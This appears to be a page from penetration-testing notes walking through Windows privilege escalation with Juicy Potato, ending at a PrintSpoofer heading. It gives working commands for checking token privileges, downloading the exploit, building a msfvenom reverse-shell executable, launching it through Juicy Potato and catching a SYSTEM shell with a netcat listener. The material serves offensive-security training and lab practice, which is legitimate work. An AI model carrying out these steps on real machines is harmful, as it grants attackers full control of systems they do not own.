---
legal-banner: true
---

### **Introduction**

Service accounts are often configured with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.  
These allow an account to impersonate the access tokens of other users, including the SYSTEM user.

??? info "Important"

    Juicy Potato does **not** work on Windows 10 version 1809 or later, nor on Server 2019.  
    For Server 2016, Server 2019, and Windows 10 (1607 onwards), use **PrintSpoofer.exe** instead.

### **Exploiting privileges with Juicy Potato**

Rotten Potato was a limited exploit. Juicy Potato improves on it by leveraging more CLSIDs and methods of exploitation.  
(The following example uses Windows 7.)

1.  Verify that the current user has `SeImpersonatePrivilege`:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/144.png)
    
2.  Download `JuicyPotato.exe` from GitHub:  
    `curl -L -o JuicyPotato.exe https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`  

    ![](../../../img/Windows-Environment/145.png)

    **Note:** This binary is 64-bit. A 32-bit version is available [here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1).
    
3.  Determine the OS version and build:  
    `systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"`  
    
    ![](../../../img/Windows-Environment/146.png)
    
4.  Example: Windows 10 Professional, Build 10586 → Version 1511.  
    Since 1511 < 1809, the machine is potentially vulnerable if not patched.  
    
    ![](../../../img/Windows-Environment/147.png)
    
5.  Generate a reverse shell executable using `msfvenom` (or use `nc.exe`):  
    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1234 -a x64 --platform Windows -f exe -o shell.exe`  
    
    ![](../../../img/Windows-Environment/148.png)
    
6.  Transfer `JuicyPotato.exe` and `shell.exe` to the target (see File Transfer section for techniques).  
    
    ![](../../../img/Windows-Environment/149.png)
    
7.  Test the exploit by redirecting output to a file:  
    ```
    C:\Users\Public\Downloads\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\Users\Public\Downloads\output.txt" -t *
    ```  
    
    ![](../../../img/Windows-Environment/150.png)
    
8.  Start a Netcat listener and execute the reverse shell via Juicy Potato:  
    ```
    C:\Users\Public\Downloads\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Downloads\shell.exe" -t *
    ```  
    
    ![](../../../img/Windows-Environment/151.png)
    
9.  If successful, you’ll receive a SYSTEM shell on the listener:  
    `sudo rlwrap -cAr nc -lvnp 1234`  
    
    ![](../../../img/Windows-Environment/152.png)

### **Impersonating the LOCAL SYSTEM account with PrintSpoofer**